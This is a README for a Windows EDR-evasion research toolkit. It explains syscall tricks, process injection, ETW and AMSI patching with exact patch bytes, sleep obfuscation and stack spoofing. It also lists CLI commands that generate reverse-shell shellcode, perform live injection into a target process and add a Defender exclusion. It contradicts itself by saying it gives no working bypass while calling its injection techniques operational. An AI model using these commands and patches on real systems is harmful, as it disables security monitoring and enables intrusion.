# Badang

**EDR Evasion Research Toolkit** — demonstrates and documents Windows EDR evasion techniques for authorized security research and red team operations.

[![Rust](https://img.shields.io/badge/Rust-1.98+-orange?logo=rust)](https://www.rust-lang.org/)
[![Windows](https://img.shields.io/badge/Windows-x86_64-blue?logo=windows)](https://windows.microsoft.com/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Security Research](https://img.shields.io/badge/Security-Research-red?logo=security)](https://github.com/aimansam/badang)
[![CI](https://github.com/aimansam/badang/actions/workflows/ci.yml/badge.svg)](https://github.com/aimansam/badang/actions/workflows/ci.yml)

---

## ⚠️ Legal & Ethical Notice

**This tool is for authorized security research and educational purposes only.**

- Using these techniques against systems without explicit written authorization is **illegal** in most jurisdictions.
- This toolkit does **not** provide a working EDR bypass — it demonstrates techniques that EDR developers and red teams study.
- Always obtain proper authorization before testing against any system.
- The author assumes no liability for misuse.

---

## What is Badang?

Badang (named after the Malaysian folk hero known for supernatural strength) is a research toolkit that demonstrates techniques used to bypass or evade Endpoint Detection and Response (EDR) systems on Windows. It covers:

1. **Direct & Indirect Syscall Invocation** — Bypassing user-mode API hooks by calling kernel functions directly via `syscall`, or indirectly via Hell's Gate / Halo's Gate
2. **Process Injection Techniques** — 7 methods for injecting code into other processes (CreateRemoteThread, APC, Thread Hijack, Early Bird, Section Mapping, Callback Execution, Module Stomping)
3. **API Unhooking** — Restoring original function bytes to neutralize EDR hooks
4. **Hook Detection Analysis** — Identifying which APIs have been hooked by security software
5. **ETW Patching & AMSI Bypass** — Blinding EDR telemetry and disabling script scanning
6. **Shellcode Encryption** — XOR/RC4 encryption with PIC decryption stubs to defeat static signatures
7. **PPID Spoofing** — Spawning processes with fake parent PIDs to evade process tree analysis
8. **Sleep Obfuscation** — Encrypting shellcode in memory during sleep to evade memory scanners
9. **Stack Spoofing** — Building fake call stack frames to bypass EDR stack-walking

Each technique includes detailed documentation of how it works, why it can bypass EDR, and what detection methods exist.

---

## Features

| Module | Description |
|--------|-------------|
| **Syscall** | Direct syscall invocation with Windows syscall number reference table (13 NT APIs) |
| **Indirect Syscall** | Hell's Gate / Halo's Gate — resolve SSNs at runtime from ntdll PE, execute from ntdll's own gadget |
| **Injection** | 7 live process injection techniques: CreateRemoteThread, APC, Thread Hijack, Early Bird APC, Section Mapping, Callback Execution, Module Stomping |
| **ETW** | Patch EtwEventWrite/EtwEventWriteFull/NtTraceEvent to blind EDR telemetry |
| **AMSI** | Patch AmsiScanBuffer/AmsiScanString to bypass script scanning |
| **Encrypt** | XOR (single/multi-byte) and RC4 shellcode encryption with PIC decryption stubs |
| **PPID** | PPID spoofing — spawn processes with fake parent PIDs |
| **Sleep** | Sleep obfuscation — encrypt memory during sleep, decrypt on wake |
| **Stack Spoof** | Build fake call stack frames to bypass EDR stack-walking |
| **Unhook** | API unhooking via memory comparison and byte restoration |
| **Detect** | Hook detection analysis — identify hooked APIs in target processes |
| **PE** | Shared PE helpers — export table parsing, .text section finding, pattern scanning |
| **Safety** | Built-in safety controls: `--dry-run` mode, `--pid` required, system process protection, payload verification |

## Payload Generation

Badang includes a built-in x86_64 shellcode generator — no msfvenom needed:

```bash
# Generate a WinExec payload
badang-cli.exe generate --type exec --command "calc.exe" -o payload.bin

# Generate a reverse shell
badang-cli.exe generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin
```

All payloads use PEB walking (`gs:[0x60]` → kernel32) and ROR13 API hashing. Types: `exec`, `messagebox`, `reverse_tcp`, `bind_tcp`, `nop`.

External payloads are also supported — use `load` to verify before injecting:

```bash
badang-cli.exe load --payload shellcode.bin
```

### Safety Framework

Badang includes mandatory safety controls:
- `--dry-run` mode enabled by default — simulates without executing
- `--pid` required for analyze/inject commands
- System processes (PID < 100) are protected and cannot be targeted
- `--confirm` flag required to disable dry-run mode
- Live injection requires both `--execute` AND `--confirm`

---

## Supported Windows APIs

Badang includes syscall numbers for the following NT APIs (Windows 10 22H2 x64 reference):

| API | Syscall # | Description |
|-----|-----------|-------------|
| NtCreateThreadEx | 0x5A | Create a thread in another process |
| NtAllocateVirtualMemory | 0x4B | Allocate memory in a process |
| NtWriteVirtualMemory | 0x3A | Write memory to a process |
| NtProtectVirtualMemory | 0x4D | Change memory protection |
| NtMapViewOfSection | 0x5B | Map a memory section |
| NtQueueApcThread | 0x2B | Queue an APC to a thread |
| NtCreateFile | 0x55 | Create/open a file |
| NtOpenFile | 0x53 | Open a file |
| NtReadFile | 0x3F | Read from a file |
| NtWriteFile | 0x50 | Write to a file |
| NtDeviceIoControlFile | 0x52 | Device I/O control |
| NtClose | 0x0C | Close a handle |
| NtWaitForSingleObject | 0x66 | Wait for an object |

> **WARNING:** Syscall numbers change between Windows versions. Never hardcode them in production tools. Badang includes them for research/reference only.

---

## Windows Defender

Windows Defender **will flag this project** as malicious — this is expected for security research toolkits. Add an exclusion before building:

```powershell
# Run as Administrator
Add-MpPreference -ExclusionPath "C:\path\to\badang"
```

See [docs/build.md](docs/build.md#windows-defender-exclusions) for restore instructions and alternatives.

---

## Quickstart

### Build and Run (5 minutes)

```bash
# Clone
git clone https://github.com/aimansam/badang.git
cd badang

# Build the GUI (requires --features gui)
cargo build --release --bin badang --features gui

# Build the CLI
cargo build --release --bin badang-cli

# Launch the GUI
.\target\release\badang.exe

# Or use the CLI — all commands default to dry-run mode
.\target\release\badang-cli.exe analyze --pid 1234
.\target\release\badang-cli.exe syscall -s NtCreateThreadEx
.\target\release\badang-cli.exe inject -p 4231 -t APC
.\target\release\badang-cli.exe unhook -u NtCreateFile
```

### CI/CD

This project includes a GitHub Actions workflow that:
- Builds both **GUI** and **CLI** binaries on **ubuntu-latest** and **windows-latest**
- Runs `cargo fmt`, `cargo clippy` (with and without `gui` feature), `cargo test`
- Verifies Windows cross-compile from Linux (both CLI and GUI)
- Runs `cargo audit` for security vulnerability scanning
- Uploads both Windows release binaries as artifacts

```bash
# View CI status
gh run list --repo aimansam/badang
```

### Cross-Platform Build

```bash
# Build Windows binaries from Linux
rustup target add x86_64-pc-windows-gnu
cargo build --release --target x86_64-pc-windows-gnu            # CLI
cargo build --release --target x86_64-pc-windows-gnu --features gui  # GUI
```

---

## Installation

### Prerequisites

- **Windows x86_64** (Badang is Windows-specific)
- **Rust** 1.98+ ([rustup](https://rustup.rs/))
- **git** (for Windows)

### Build from Source

```bash
# Clone the repository
git clone https://github.com/aimansam/badang.git
cd badang

# Build both binaries
cargo build --release --bin badang-cli
cargo build --release --bin badang --features gui

# Binary locations
.\target\release\badang.exe       # GUI
.\target\release\badang-cli.exe   # CLI
```

### Cross-Compilation

For Windows targets from Linux/macOS:

```bash
# Add Windows target (GNU toolchain — requires mingw-w64)
rustup target add x86_64-pc-windows-gnu

# Build CLI and GUI for Windows
cargo build --release --target x86_64-pc-windows-gnu
cargo build --release --target x86_64-pc-windows-gnu --features gui
```

---

## Usage

### GUI (Desktop Application)

Launch `badang.exe` (built with `--features gui`) for the native desktop interface:

- **Tab bar**: Switch between Scan, Analyze, Syscall, Inject, Load, Unhook, ETW, AMSI, PPID, Sleep, and Spoof panels
- **Dry Run toggle**: ON by default (green indicator in the top bar). Click to toggle.
- **Confirm checkbox**: Required alongside Dry Run OFF for live operations
- **Log panel**: Scrollable output at the bottom — color-coded by severity
- **File browser**: Native file dialog for selecting payload files

The GUI provides the same safety controls as the CLI: dry-run by default, PID validation, system process protection, and confirmation requirements.

### Command Line Interface

```bash
# Show help
badang-cli.exe --help

# Analyze a process for hooked APIs (DRY RUN by default)
badang-cli.exe analyze --pid 1234

# Direct syscall invocation (DRY RUN)
badang-cli.exe syscall --func NtCreateThreadEx

# Process injection technique demonstration (DRY RUN)
badang-cli.exe inject --pid 1234 --technique CreateRemote

# Load a shellcode payload file (no execution)
badang-cli.exe load --payload shellcode.bin

# LIVE injection (requires --execute --confirm)
badang-cli.exe inject --pid 1234 --technique createremote --payload shellcode.bin --execute --confirm
badang-cli.exe inject --pid 1234 --technique apc --payload shellcode.bin -x -c
badang-cli.exe inject --pid 1234 --technique hijack --payload shellcode.bin -x -c
badang-cli.exe inject --technique earlybird --payload shellcode.bin -x -c          # no PID needed
badang-cli.exe inject --pid 1234 --technique section --payload shellcode.bin -x -c

# API unhooking demonstration (DRY RUN)
badang-cli.exe unhook --func NtCreateFile
```

### Commands

| Command | Description | Requires `--pid` |
|---------|-------------|------------------|
| `analyze` | Detect hooked APIs in a target process | Yes |
| `syscall` | Direct/indirect syscall invocation (add `--indirect` for Hell's Gate) | No |
| `inject` | Process injection (7 techniques — see below) | Depends |
| `unhook` | Demonstrate API unhooking | No |
| `etw` | Patch ETW functions to blind EDR telemetry | No |
| `amsi` | Patch AMSI functions to bypass script scanning | No |
| `encrypt` | Encrypt shellcode with XOR/RC4 (adds decryption stub) | No |
| `ppid` | PPID spoofing (spawn process with fake parent) | No |
| `sleep` | Sleep obfuscation demo (encrypt memory during sleep) | No |
| `spoof` | Stack spoofing demo (fake call stack frames) | No |
| `generate` | Generate shellcode payload (exec/msgbox/reverse/bind) | No |
| `convert` | Convert shellcode between formats | No |
| `load` | Load and verify a shellcode payload file | No |
| `scan` | List running processes (pick a target PID) | No |

### Safety Flags

| Flag | Description |
|------|-------------|
| `--dry-run` | Simulate without executing (default: true) |
| `--confirm` | Disable dry-run and execute (required for real operations) |
| `--pid <PID>` | Target process ID (required for analyze/inject) |
| `--payload <PATH>` | Shellcode payload file path (required for load, optional for inject) |
| `--verbose` | Enable verbose output |
| `--func <name>` | Target API/function name (alias for --syscall) |

### Example: Analyze a Process

```bash
# Dry-run analysis (default)
badang-cli.exe analyze --pid 4231

# With confirmation to actually execute
badang-cli.exe analyze --pid 4231 --confirm
```

---

## How It Works

### Direct Syscall Invocation

Windows APIs in `ntdll.dll` typically act as thin wrappers that set up registers and execute the `syscall` instruction to transition to kernel mode. EDRs commonly hook these user-mode API functions (by patching the prologue with a JMP to EDR code).

Direct syscall invocation bypasses this by:
1. Resolving the syscall number for the target function (varies by Windows version)
2. Setting up arguments in registers per the x64 calling convention (rcx, rdx, r8, r9)
3. Setting rax = syscall number
4. Executing the `syscall` instruction directly

This skips the hooked `ntdll.dll` entirely, going straight from user-mode to kernel-mode.

**Limitations:**
- Syscall numbers change per Windows version (must resolve dynamically)
- Kernel callbacks (ETW, kernel callbacks) still observe the syscall
- Not all functions are available via direct syscall
- EDRs increasingly monitor syscall patterns

### Process Injection

Badang implements 7 live injection techniques (all operational with `--execute --confirm`):

| # | Technique | Key Evasion Angle | PID Required |
|---|-----------|-------------------|--------------|
| 1 | **CreateRemoteThread** | Classic baseline — allocate, write, create remote thread | Yes |
| 2 | **APC Injection** | No new thread created — queues APC to existing threads | Yes |
| 3 | **Thread Hijack (SetThreadContext)** | No new thread, no APC — hijacks existing thread's RIP | Yes |
| 4 | **Early Bird APC** | Runs before EDR hooks install — spawns suspended process | No |
| 5 | **Section Mapping (MapViewOfFile)** | `WriteProcessMemory` never called — uses shared memory section | Yes |
| 6 | **Callback Execution (EnumWindows)** | No thread creation APIs — shellcode fires as a Windows callback | No |
| 7 | **Module Stomping** | Shellcode lives inside a signed DLL's .text — appears legitimate | No |

**CreateRemoteThread**: 6-step pipeline — OpenProcess → VirtualAllocEx → WriteProcessMemory → VirtualProtectEx → CreateRemoteThread → WaitForSingleObject.

**APC Injection**: Wraps shellcode in a callee-save trampoline, writes to target, enumerates threads via ToolHelp, queues APC to all threads. Executes when a thread enters an alertable wait state.

**Thread Hijack**: Suspends a thread, saves full CONTEXT (all GPRs + RFLAGS), redirects RIP to shellcode in a full-register-save trampoline with completion flag. Polls flag, then restores original context so the thread continues normally.

**Early Bird APC**: Creates a new process with `CREATE_SUSPENDED`, writes shellcode, queues APC to the main thread, then resumes. The APC fires during process initialization — before EDR user-mode hooks are installed.

**Section Mapping**: Creates a shared memory section via `CreateFileMappingW`, maps it locally to write shellcode (`memcpy`, not `WriteProcessMemory`), then maps the same section into the target process via `MapViewOfFileNuma2` as `PAGE_EXECUTE_READ`. EDR hooks on `WriteProcessMemory` see nothing.

**Callback Execution**: Allocates local memory, writes shellcode, casts to `WNDENUMPROC`, calls `EnumWindows`. No `CreateThread` or `CreateRemoteThread` — the shellcode fires as a Windows callback. Returns `FALSE` to stop enumeration after executing.

**Module Stomping**: Loads a legitimate signed DLL (`xpsservices.dll`) with `DONT_RESOLVE_DLL_REFERENCES`, parses PE to find `.text` section, overwrites it with shellcode. Memory scanners see shellcode backed by a Microsoft-signed module, not anonymous executable pages.

### Indirect Syscalls (Hell's Gate / Halo's Gate)

Resolves SSNs at runtime by parsing ntdll's PE export table in memory, then executes the `syscall` instruction from a gadget inside ntdll's own `.text` section. Bypasses EDR checks for syscalls originating outside ntdll.

**Hell's Gate**: If function prologue matches `4C 8B D1 B8 xx xx 00 00` (clean), reads SSN directly.

**Halo's Gate**: If function is hooked (prologue patched), walks to neighboring `Zw*` exports. If neighbor is clean at distance ±N, target SSN = neighbor_ssn ∓ N.

### ETW Patching & AMSI Bypass

**ETW**: Patches `EtwEventWrite` / `EtwEventWriteFull` / `NtTraceEvent` in `ntdll.dll` with `0xC3` (ret), blinding ETW telemetry that EDRs rely on.

**AMSI**: Loads `amsi.dll`, patches `AmsiScanBuffer` / `AmsiScanString` with `B8 57 00 07 80 C3` (mov eax, E_INVALIDARG; ret) — 6 bytes that make AMSI return "invalid" for all scans.

### Sleep Obfuscation

Encrypts shellcode in memory during sleep periods. Before sleeping: `VirtualProtect(RW)` → XOR-encrypt in-place → `VirtualProtect(NOACCESS)`. After waking: decrypt → `VirtualProtect(RX)`. Memory scanners see encrypted garbage with NOACCESS protection.

### Stack Spoofing

Builds fake call stack frames before calling Windows APIs. Scans ntdll/kernel32 `.text` for ROP gadgets (`ret`, `pop rbp; ret`), constructs a chain of fake frames with legitimate return addresses. EDR stack-walking sees ntdll → kernel32 instead of shellcode.

### API Unhooking

EDRs hook APIs by modifying the function prologue in memory (typically inserting a JMP instruction). Unhooking reverses this by:
1. Reading the hooked function's bytes from the target process
2. Reading the clean version from a known-good `ntdll.dll` on disk
3. Comparing the bytes to identify the hook
4. Restoring the original bytes

### Hook Detection

Detection analysis identifies which APIs have been hooked by:
1. Getting the address of target APIs via `GetProcAddress`
2. Reading the first N bytes of each function
3. Comparing against known clean prologue patterns (e.g., `mov r10, rcx; mov eax, syscall; syscall`)
4. Reporting which APIs are hooked and the hook type (JMP, PUSH/POP, INT3)

---

## Project Structure

```
badang/
├── Cargo.toml              # Rust project configuration
├── .github/
│   └── workflows/
│       └── ci.yml          # GitHub Actions CI/CD
├── docs/                   # Documentation
│   ├── build.md            # Build & architecture
│   ├── cli.md              # CLI usage reference
│   ├── features.md         # Feature overview
│   ├── gui.md              # GUI usage guide
│   ├── hooking.md          # EDR hooking explained
│   └── killchain.md        # Badang in the kill chain
├── src/
│   ├── lib.rs              # Library crate root
│   ├── cli.rs              # Command-line argument parsing
│   ├── log.rs              # Shared logging sink (CLI + GUI)
│   ├── safety.rs           # Safety controls and validation
│   ├── pe.rs               # Shared PE helpers (exports, .text, pattern scan)
│   ├── process.rs          # Process enumeration + filtering
│   ├── tests.rs            # Integration tests (113 tests)
│   │
│   ├── analysis/           # Hook detection & restoration
│   │   ├── mod.rs
│   │   ├── detect.rs       # Hook detection (ReadProcessMemory + classify)
│   │   └── unhook.rs       # API unhooking (Direct Byte, Trampoline, Inline)
│   │
│   ├── evasion/            # EDR evasion techniques
│   │   ├── mod.rs
│   │   ├── etw.rs          # ETW patching (blind EDR telemetry)
│   │   ├── amsi.rs         # AMSI bypass (patch AmsiScanBuffer)
│   │   ├── ppid.rs         # PPID spoofing (fake parent process)
│   │   ├── sleep_obfs.rs   # Sleep obfuscation (encrypt during sleep)
│   │   └── stack_spoof.rs  # Stack spoofing (fake call frames)
│   │
│   ├── syscall/            # Syscall invocation
│   │   ├── mod.rs          # SSN table + direct invocation
│   │   └── indirect.rs     # Hell's Gate / Halo's Gate
│   │
│   ├── payload/            # Payload handling
│   │   ├── mod.rs
│   │   ├── format.rs       # Byte format converter + hex dump
│   │   ├── encrypt.rs      # Shellcode encryption (XOR/RC4 + PIC stubs)
│   │   └── generate.rs     # Shellcode generator (PEB walk + template patch)
│   │
│   ├── injection/          # Process injection (7 techniques)
│   │   ├── mod.rs          # Types, dispatch, dry-run docs
│   │   ├── common.rs       # Shared helpers (write_remote_payload, cleanup)
│   │   ├── wrappers.rs     # APC + hijack trampoline builders
│   │   ├── crt.rs          # CreateRemoteThread
│   │   ├── apc.rs          # APC Injection
│   │   ├── hijack.rs       # Thread Hijack (SetThreadContext)
│   │   ├── earlybird.rs    # Early Bird APC
│   │   ├── section.rs      # Section Mapping (MapViewOfFile)
│   │   ├── callback.rs     # Callback Execution (EnumWindows)
│   │   └── stomp.rs        # Module Stomping
│   │
│   ├── bin/
│   │   ├── cli.rs          # CLI binary entry point (badang-cli)
│   │   └── gui.rs          # GUI binary entry point (badang)
│   └── gui/
│       ├── mod.rs          # GUI module root
│       ├── app.rs          # egui application struct
│       ├── theme.rs        # Dark hacker theme
│       └── panels/         # One panel per command (11 panels)
│           ├── analyze.rs, syscall.rs, inject.rs, load.rs,
│           ├── unhook.rs, etw.rs, amsi.rs, ppid.rs,
│           ├── sleep.rs, spoof.rs, scan.rs, log_panel.rs
├── target/                 # Build output (gitignored)
└── README.md               # This file
```

---

## Research & Learning Resources

- [Windows Syscall Numbers](https://j00ru.vexilla.net/2011/04/windows-kernel-injection.html) — Historical syscall number reference
- [Unhooking Windows API](https://github.com/idiotc4t/unhooking-windows) — API unhooking techniques
- [Direct Syscall](https://github.com/TheWover/directsyscall) — Direct syscall implementation
- [Microsoft Windows Internals](https://docs.microsoft.com/en-us/windows/win32/api/) — Official Windows API documentation

---

## Contributing

This is a research project. Contributions are welcome for:
- Additional syscall numbers for different Windows versions
- Documentation improvements
- Detection analysis enhancements
- Safety framework improvements

---

## License

MIT License — see [LICENSE](LICENSE) for details.

---

## Author

Built by [Aiman](https://github.com/aimansam) as part of the automated cybersecurity research pipeline.

**Badang** — named after the Malaysian folklore hero who possessed supernatural strength. A fitting name for a toolkit that pushes the boundaries of what's possible in Windows security research.

---

*For authorized security research and educational purposes only.*
